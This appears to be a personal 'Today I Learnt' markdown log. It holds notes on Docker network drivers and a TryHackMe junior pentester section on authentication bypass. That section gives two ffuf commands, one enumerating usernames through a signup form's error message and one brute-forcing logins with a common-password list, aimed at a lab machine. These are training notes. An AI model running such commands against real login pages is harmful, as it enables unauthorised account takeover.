# Today-I-Learnt

## TIL 05/06/2022

### Docker Network

* You can connect docker containers and services with each other as well as to non-docker workloads

* Docker is a software to build and run containers(_Containers are lightweight packages of your application code together with dependencies such as specific versions of programming language runtimes and libraries required to run your software services._) whereas Kuberentes is an orchestration tool i.e it is used to operate multiple containers at a large scale .

* Docker manipulates iptable rules for networking

* Docker also provides a system for scaling called __Docker Swarm__

* Docker network drivers (bridge, host, overlay, ipvlan, macvlan, none). You can also use third party plugins

* User-defined bridge networks are best when you need multiple containers to communicate on the same Docker host. [Default network](https://docs.docker.com/network/network-tutorial-standalone/)

* [Host networks](https://docs.docker.com/network/network-tutorial-host/) are best when the network stack should not be isolated from the Docker host, but you want other aspects of the container to be isolated.

* [Overlay networks](https://docs.docker.com/network/network-tutorial-overlay/) are best when you need containers running on different Docker hosts to communicate, or when multiple applications work together using swarm services.

* [Macvlan networks](https://docs.docker.com/network/network-tutorial-macvlan/) are best when you are migrating from a VM setup or need your containers to look like physical hosts on your network, each with a unique MAC address.

* Third-party network plugins allow you to integrate Docker with specialized network stacks.


### Linux Monitoring


### Tryhackme
#### Course 1. Jnr Pentester 
##### Chapter 1. Authentication Bypass
```bash
# Fuzzing a username
# Which ever field needs to be fuzzed should have a value set as 'FUZZ' 
# '-mr' is the flag used to slect what is the valid output we are looking for in the page
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" 

# Fuzzing password
# When we pass the file as values to the field we use '-w'
# -fc flag is used for status code we are looking for
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.228.119/customers/login -fc 200

```

## TIL 06/06/2022


## TIL 07/06/2022



## TIL 08/06/2022